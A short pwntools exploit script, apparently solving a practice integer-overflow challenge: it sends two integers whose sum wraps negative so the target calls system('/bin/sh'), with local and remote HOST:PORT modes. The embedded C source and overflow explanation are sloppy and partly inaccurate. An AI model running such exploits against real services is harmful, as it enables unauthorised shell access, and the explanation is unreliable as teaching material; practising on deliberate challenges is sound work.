from pwn import *

var_int_1 = 1073741823
var_int_2 = 1073741823 + 1337

'''
    @@ (Integer OverFloaw)

       source code:
            int main(){
                unsigned long  var_int_1
                unsigned long  var_int_2;
                unsigned long  sum;

                sum = var_int_1 + var_int_2;
                if ((int)sum < 0)
                {
                    system("/bin/sh");
                }
            }

        explain:

           /*
            *      int:
            *               2  (0, 1) (ON, OFF)
            *               31 bit    (for numbers)
            *               1  bit    (for negative and positive)
            *
            *                                               Mn = 2^n âˆ’ 1 : (Mersenne prime)
            *               2^31  =   (-2,147,483,648) or (2,147,483,647)
            *
            *      Then:
            *         2,147,483,647 + 1 = -2,147,483,648
            *                -2,147,483,648 < 0
            */

'''
def exploit_l(file: str):
    p = process(file)
    p.recv()
    p.sendline(str(var_int_1).encode())
    p.sendline(str(var_int_2).encode())
    p.interactive()

def exploit_r(host_port: list):
    HOST, PORT = host_port[0], host_port[1]
    c = remote(HOST, int(PORT))
    c.recv()
    c.sendline(str(var_int_1).encode())
    c.sendline(str(var_int_2).encode())
    c.interactive()

def main():
    import sys
    try:
        content: str = sys.argv[2]
        if sys.argv[1] == "-l": exploit_l(content)
        if sys.argv[1] == "-r": exploit_r(content.split(":"))
    except:
        print("python exploit.py -l file.out        : for locally  exploit")
        print("python exploit.py -r HOST:PORT       : for remotely exploit!")

if __name__ == "__main__":
    main()
